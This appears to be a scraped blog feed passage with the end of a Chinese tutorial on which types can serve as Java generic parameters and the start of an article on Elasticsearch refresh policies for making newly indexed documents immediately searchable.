<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ? 表示未知类型</span>
List&lt;?&gt; wildcardList;          <span class="hljs-comment">// 任意类型</span>
List&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span>&gt; nums;   <span class="hljs-comment">// Number或其子类</span>
List&lt;? <span class="hljs-built_in">super</span> Integer&gt; ints;    <span class="hljs-comment">// Integer或其父类</span>
</code></pre>
<h3 data-id="heading-4">3. <strong>泛型数组</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 可以声明泛型数组引用</span>
T[] array;                      <span class="hljs-comment">// ✅ 可以声明</span>
<span class="hljs-comment">// T[] arr = new T[10];         // ❌ 不能创建实例</span>
</code></pre>
<h3 data-id="heading-5">4. <strong>嵌套泛型</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 多层嵌套</span>
Map&lt;String, List&lt;Integer&gt;&gt; map;                <span class="hljs-comment">// Map的value是List</span>
List&lt;Map.Entry&lt;String, Integer&gt;&gt; entries;      <span class="hljs-comment">// List的元素是Map.Entry</span>
Box&lt;Pair&lt;String, Integer&gt;&gt; box;                <span class="hljs-comment">// 复杂嵌套</span>
</code></pre>
<h2 data-id="heading-6">三、不允许的类型</h2>
<h3 data-id="heading-7">1. <strong>基本类型</strong>（最重要的限制）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ❌ 不能使用基本类型</span>
Box&lt;<span class="hljs-type">int</span>&gt; intBox;               <span class="hljs-comment">// 编译错误！</span>
Box&lt;<span class="hljs-type">double</span>&gt; doubleBox;         <span class="hljs-comment">// 编译错误！</span>
Box&lt;<span class="hljs-type">char</span>&gt; charBox;             <span class="hljs-comment">// 编译错误！</span>

<span class="hljs-comment">// ✅ 必须使用包装类</span>
Box&lt;Integer&gt; intBox;           <span class="hljs-comment">// 正确</span>
Box&lt;Double&gt; doubleBox;         <span class="hljs-comment">// 正确</span>
Box&lt;Character&gt; charBox;        <span class="hljs-comment">// 正确</span>
</code></pre>
<h3 data-id="heading-8">2. <strong>原始类型</strong>（不建议，但允许）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ⚠️ 原始类型（raw type）- 已过时</span>
<span class="hljs-type">Box</span> <span class="hljs-variable">rawBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>();        <span class="hljs-comment">// 警告：未指定泛型类型</span>
Box&lt;String&gt; stringBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>();  <span class="hljs-comment">// ✅ 应该这样</span>
</code></pre>
<h3 data-id="heading-9">3. <strong>具体值/实例</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ❌ 不能是具体值</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-string">"string"</span>&gt; {}         <span class="hljs-comment">// 错误</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>()&gt; {}     <span class="hljs-comment">// 错误</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-number">10</span>&gt; {}               <span class="hljs-comment">// 错误</span>
</code></pre>
<h3 data-id="heading-10">4. <strong>静态上下文</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-comment">// ❌ 不能有静态泛型字段</span>
    <span class="hljs-keyword">static</span> T staticField;       <span class="hljs-comment">// 编译错误</span>
    
    <span class="hljs-comment">// ❌ 静态方法不能使用类的类型参数</span>
    <span class="hljs-keyword">static</span> T <span class="hljs-title function_">staticMethod</span><span class="hljs-params">()</span> {   <span class="hljs-comment">// 编译错误</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-comment">// ✅ 静态方法可以有自己独立的泛型参数</span>
    <span class="hljs-keyword">static</span> &lt;U&gt; U <span class="hljs-title function_">genericMethod</span><span class="hljs-params">(U param)</span> {
        <span class="hljs-keyword">return</span> param;
    }
}
</code></pre>
<h2 data-id="heading-11">四、边界限制</h2>
<h3 data-id="heading-12">1. <strong>类型边界</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 只能扩展类或实现接口，不能是其他</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span> &amp; Comparable&lt;T&gt;&gt; {  <span class="hljs-comment">// ✅ 正确</span>
    <span class="hljs-comment">// T必须是Number的子类且实现Comparable</span>
}

<span class="hljs-comment">// ❌ 错误边界</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T <span class="hljs-built_in">super</span> String&gt; {}    <span class="hljs-comment">// 不能使用super</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T extends <span class="hljs-number">100</span>&gt; {}     <span class="hljs-comment">// 不能是具体值</span>
</code></pre>
<h3 data-id="heading-13">2. <strong>多重边界</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 最多一个类，多个接口</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Container</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span> &amp; Comparable&lt;T&gt; &amp; Serializable&gt; {
    <span class="hljs-comment">// T必须：继承Number，实现Comparable和Serializable</span>
    <span class="hljs-comment">// 注意：类必须在前，接口在后</span>
}
</code></pre>
<h2 data-id="heading-14">五、实际使用中的类型</h2>
<h3 data-id="heading-15">1. <strong>集合框架（最常用）</strong></h3>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; strings = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();      <span class="hljs-comment">// 列表</span>
Set&lt;Integer&gt; numbers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();        <span class="hljs-comment">// 集合</span>
Map&lt;String, Integer&gt; scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">// 映射</span>
Queue&lt;Double&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();      <span class="hljs-comment">// 队列</span>
</code></pre>
<h3 data-id="heading-16">2. <strong>自定义数据结构</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 节点类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;T&gt; {
    T data;
    Node&lt;T&gt; next;
    
    Node(T data) {
        <span class="hljs-built_in">this</span>.data = data;
    }
}

<span class="hljs-comment">// 二叉树</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TreeNode</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Comparable</span>&lt;T&gt;&gt; {
    T value;
    TreeNode&lt;T&gt; left;
    TreeNode&lt;T&gt; right;
}
</code></pre>
<h3 data-id="heading-17">3. <strong>函数式接口</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 带泛型的函数式接口</span>
<span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span>&lt;T, R&gt; {
    R <span class="hljs-title function_">transform</span><span class="hljs-params">(T input)</span>;
}

<span class="hljs-comment">// 使用</span>
Transformer&lt;String, Integer&gt; lengthGetter = String::length;
Transformer&lt;Integer, String&gt; stringConverter = Object::toString;
</code></pre>
<h2 data-id="heading-18">六、类型推断（钻石运算符）</h2>
<h3 data-id="heading-19">1. <strong>自动类型推断</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Java 7+ 钻石运算符</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();      <span class="hljs-comment">// ✅ 自动推断为&lt;String&gt;</span>

<span class="hljs-comment">// Java 7之前</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;(); <span class="hljs-comment">// ✅ 老写法</span>

<span class="hljs-comment">// 嵌套泛型也能推断</span>
Map&lt;String, List&lt;Integer&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
</code></pre>
<h3 data-id="heading-20">2. <strong>方法类型推断</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 方法调用时自动推断</span>
&lt;T&gt; T <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Class&lt;T&gt; clazz)</span> { ... }

<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> getDefault(String.class);      <span class="hljs-comment">// T推断为String</span>
<span class="hljs-type">Integer</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> getDefault(Integer.class);    <span class="hljs-comment">// T推断为Integer</span>
</code></pre>
<h2 data-id="heading-21">七、特殊限制及解决方案</h2>
<h3 data-id="heading-22">1. <strong>基本类型的解决方案</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 问题：不能直接用int</span>
<span class="hljs-comment">// Box&lt;int&gt; box;  // ❌ 错误</span>

<span class="hljs-comment">// 解决方案1：使用包装类</span>
Box&lt;Integer&gt; intBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;&gt;();

<span class="hljs-comment">// 解决方案2：使用特化版本（第三方库如fastutil）</span>
<span class="hljs-comment">// IntBox, LongBox等专用容器</span>

<span class="hljs-comment">// 解决方案3：Java未来可能支持（Valhalla项目）</span>
</code></pre>
<h3 data-id="heading-23">2. <strong>类型擦除的影响</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 运行时类型信息丢失</span>
Box&lt;String&gt; stringBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;&gt;();
Box&lt;Integer&gt; integerBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;&gt;();

<span class="hljs-comment">// 运行时都是Box&lt;Object&gt;</span>
System.out.println(stringBox.getClass() == integerBox.getClass()); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 解决方案：传递Class对象</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> Class&lt;T&gt; type;  <span class="hljs-comment">// 保存类型信息</span>
    Box(Class&lt;T&gt; type) {
        <span class="hljs-built_in">this</span>.type = type;
    }
}
</code></pre>
<h2 data-id="heading-24">八、检查清单</h2>
<h3 data-id="heading-25">✅ 可以用作泛型参数：</h3>
<ol>
<li>任何引用类型（类、接口）</li>
<li>其他泛型类型（<code>List&lt;String&gt;</code>）</li>
<li>通配符（<code>?</code>, <code>? extends T</code>, <code>? super T</code>）</li>
<li>数组类型（作为声明）</li>
</ol>
<h3 data-id="heading-26">❌ 不能用作泛型参数：</h3>
<ol>
<li>基本类型（int, double, char等）</li>
<li>具体值或实例</li>
<li>原始类型（应避免）</li>
<li>在静态上下文中使用类的类型参数</li>
</ol>
<h3 data-id="heading-27">⚠️ 需要注意：</h3>
<ol>
<li>多重边界时类在前，接口在后</li>
<li>类型擦除导致运行时类型信息丢失</li>
<li>不能创建泛型数组实例</li>
</ol>
<h2 data-id="heading-28">九、一句话记忆规则</h2>
<p><strong>泛型类型参数 = 任何引用类型 + 通配符，但不能是基本类型或具体值，静态上下文有限制。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elasticsearch 如何确保新增文档立即可见？]]></title>    <link>https://juejin.cn/post/7579813925995642921</link>    <guid>https://juejin.cn/post/7579813925995642921</guid>    <pubDate>2025-12-04T09:37:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925995642921" data-draft-id="7579659550862344234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elasticsearch 如何确保新增文档立即可见？"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-04T09:37:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一个大专生的淘汰之路"/> <meta itemprop="url" content="https://juejin.cn/user/1327865775796807"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elasticsearch 如何确保新增文档立即可见？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1327865775796807/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一个大专生的淘汰之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:37:04.000Z" title="Thu Dec 04 2025 09:37:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Elasticsearch Java API：如何确保新增文档立即可见？</h2>
<h3 data-id="heading-1">引言：一个常见的开发困惑</h3>
<p>如果你在Elasticsearch开发中遇到过这样的场景，一定不会陌生：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 新增一个文档</span>
<span class="hljs-type">IndexResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.index(indexRequest, RequestOptions.DEFAULT);

<span class="hljs-comment">// 立即查询这个文档</span>
<span class="hljs-type">SearchResponse</span> <span class="hljs-variable">searchResponse</span> <span class="hljs-operator">=</span> client.search(searchRequest, RequestOptions.DEFAULT);
<span class="hljs-comment">// 结果：查不到！文档去哪儿了？</span>
</code></pre>
<p>为什么刚刚新增的文档立即查询却找不到？这背后涉及Elasticsearch的<strong>近实时搜索（NRT）机制</strong>。今天我们就来深入探讨这个问题及其解决方案。</p>
<h3 data-id="heading-2">一、理解Elasticsearch的刷新机制</h3>
<h4 data-id="heading-3">1.1 为什么新增文档不能立即看到？</h4>
<p>Elasticsearch为了提高写入性能，采用了<strong>缓冲刷新机制</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 文档写入的简化流程：</span>
<span class="hljs-number">1.</span> 文档 → 内存缓冲区（快，但不可搜索）
<span class="hljs-number">2.</span> 定期刷新 → 新的段（segment）（可搜索）
<span class="hljs-number">3.</span> 刷新间隔默认：<span class="hljs-number">1</span>秒
</code></pre>
<p>这种设计带来了性能优势，但也导致了延迟可见的问题。</p>
<h4 data-id="heading-4">1.2 Refresh 机制详解</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 三种刷新状态对比：</span>
+---------------------+-----------------+-------------------+------------------+
|      策略类型       |    写入性能     |    查询实时性     |    资源消耗      |
+---------------------+-----------------+-------------------+------------------+
| 默认（<span class="hljs-number">1</span>秒刷新）     |      高         |      近实时       |       低         |
| 立即刷新            |      低         |      实时         |       高         |
| 关闭自动刷新        |      最高       |      延迟         |       最低       |
+---------------------+-----------------+-------------------+------------------+
</code></pre>
<h3 data-id="heading-5">二、Java API中的四种解决方案</h3>
<h4 data-id="heading-6">2.1 方案一：强制刷新索引（测试环境推荐）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.elasticsearch.action.index.IndexRequest;
<span class="hljs-keyword">import</span> org.elasticsearch.action.index.IndexResponse;
<span class="hljs-keyword">import</span> org.elasticsearch.action.admin.indices.refresh.RefreshRequest;
<span class="hljs-keyword">import</span> org.elasticsearch.client.RequestOptions;
<span class="hljs-keyword">import</span> org.elasticsearch.client.RestHighLevelClient;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentCreator</span> {
    
    <span class="hljs-keyword">public</span> IndexResponse <span class="hljs-title function_">createDocumentWithRefresh</span><span class="hljs-params">(
            RestHighLevelClient client, 
            String index, 
            String id, 
            Map&lt;String, Object&gt; source)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-comment">// 1. 创建索引请求</span>
        <span class="hljs-type">IndexRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexRequest</span>(index)
                .id(id)
                .source(source);
        
        <span class="hljs-comment">// 2. 执行索引操作</span>
        <span class="hljs-type">IndexResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.index(request, RequestOptions.DEFAULT);
        
        <span class="hljs-comment">// 3. 强制刷新索引，使文档立即可见</span>
        <span class="hljs-type">RefreshRequest</span> <span class="hljs-variable">refreshRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefreshRequest</span>(index);
        client.indices().refresh(refreshRequest, RequestOptions.DEFAULT);
        
        System.out.println(<span class="hljs-string">"文档已刷新，立即可查"</span>);
        <span class="hljs-keyword">return</span> response;
    }
}
</code></pre>
<p><strong>优点</strong>：简单直接，确保100%可见
<strong>缺点</strong>：性能影响大，生产环境慎用</p>
<h4 data-id="heading-7">2.2 方案二：设置索引请求的刷新策略（生产环境推荐）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentCreator</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RefreshStrategy</span> {
        IMMEDIATE,      <span class="hljs-comment">// 立即刷新</span>
        WAIT_UNTIL,     <span class="hljs-comment">// 等待刷新</span>
        NONE            <span class="hljs-comment">// 不刷新</span>
    }
    
    <span class="hljs-keyword">public</span> IndexResponse <span class="hljs-title function_">createDocumentWithRefreshPolicy</span><span class="hljs-params">(
            RestHighLevelClient client,
            String index,
            String id,
            Map&lt;String, Object&gt; source,
            RefreshStrategy strategy)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-type">IndexRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexRequest</span>(index)
                .id(id)
                .source(source);
        
        <span class="hljs-comment">// 设置刷新策略</span>
        <span class="hljs-keyword">switch</span> (strategy) {
            <span class="hljs-keyword">case</span> IMMEDIATE:
                request.setRefreshPolicy(WriteRequest.RefreshPolicy.IMMEDIATE);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> WAIT_UNTIL:
                request.setRefreshPolicy(WriteRequest.RefreshPolicy.WAIT_UNTIL);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NONE:
                request.setRefreshPolicy(WriteRequest.RefreshPolicy.NONE);
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-keyword">return</span> client.index(request, RequestOptions.DEFAULT);
    }
    
    <span class="hljs-comment">// 使用示例</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        Map&lt;String, Object&gt; document = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        document.put(<span class="hljs-string">"title"</span>, <span class="hljs-string">"Elasticsearch实战"</span>);
        document.put(<span class="hljs-string">"author"</span>, <span class="hljs-string">"张三"</span>);
        document.put(<span class="hljs-string">"timestamp"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
        
        <span class="hljs-comment">// 需要立即可见的场景</span>
        <span class="hljs-type">IndexResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> createDocumentWithRefreshPolicy(
            client, <span class="hljs-string">"books"</span>, <span class="hljs-string">"1"</span>, document, RefreshStrategy.IMMEDIATE);
        
        <span class="hljs-comment">// 现在可以立即查询到该文档</span>
        System.out.println(<span class="hljs-string">"文档ID: "</span> + response.getId());
    }
}
</code></pre>
<h4 data-id="heading-8">2.3 方案三：使用Bulk API并控制刷新</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BulkDocumentManager</span> {
    
    <span class="hljs-keyword">public</span> BulkResponse <span class="hljs-title function_">bulkCreateWithRefreshControl</span><span class="hljs-params">(
            RestHighLevelClient client,
            List&lt;Map&lt;String, Object&gt;&gt; documents)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-type">BulkRequest</span> <span class="hljs-variable">bulkRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BulkRequest</span>();
        
        <span class="hljs-comment">// 添加多个文档</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; documents.size(); i++) {
            <span class="hljs-type">IndexRequest</span> <span class="hljs-variable">indexRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexRequest</span>(<span class="hljs-string">"my_index"</span>)
                    .id(<span class="hljs-string">"doc_"</span> + i)
                    .source(documents.get(i));
            bulkRequest.add(indexRequest);
        }
        
        <span class="hljs-comment">// 设置批量操作的刷新策略</span>
        bulkRequest.setRefreshPolicy(WriteRequest.RefreshPolicy.WAIT_UNTIL);
        
        <span class="hljs-type">BulkResponse</span> <span class="hljs-variable">bulkResponse</span> <span class="hljs-operator">=</span> client.bulk(bulkRequest, RequestOptions.DEFAULT);
        
        <span class="hljs-keyword">if</span> (bulkResponse.hasFailures()) {
            System.err.println(<span class="hljs-string">"批量操作存在失败: "</span> + bulkResponse.buildFailureMessage());
        }
        
        <span class="hljs-keyword">return</span> bulkResponse;
    }
}
</code></pre>
<h4 data-id="heading-9">2.4 方案四：使用Get API验证文档存在</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentVerifier</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDocumentVisible</span><span class="hljs-params">(
            RestHighLevelClient client,
            String index,
            String id,
            <span class="hljs-type">int</span> maxRetries,
            <span class="hljs-type">long</span> retryIntervalMs)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException {
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; maxRetries; i++) {
            <span class="hljs-type">GetRequest</span> <span class="hljs-variable">getRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GetRequest</span>(index, id);
            <span class="hljs-type">GetResponse</span> <span class="hljs-variable">getResponse</span> <span class="hljs-operator">=</span> client.get(getRequest, RequestOptions.DEFAULT);
            
            <span class="hljs-keyword">if</span> (getResponse.isExists()) {
                System.out.println(<span class="hljs-string">"文档在第 "</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">" 次尝试后可见"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            
            <span class="hljs-comment">// 等待后重试</span>
            Thread.sleep(retryIntervalMs);
        }
        
        System.out.println(<span class="hljs-string">"文档在 "</span> + maxRetries + <span class="hljs-string">" 次尝试后仍不可见"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h3 data-id="heading-10">三、性能对比与最佳实践</h3>
<h4 data-id="heading-11">3.1 性能测试对比</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceBenchmark</span> {
    
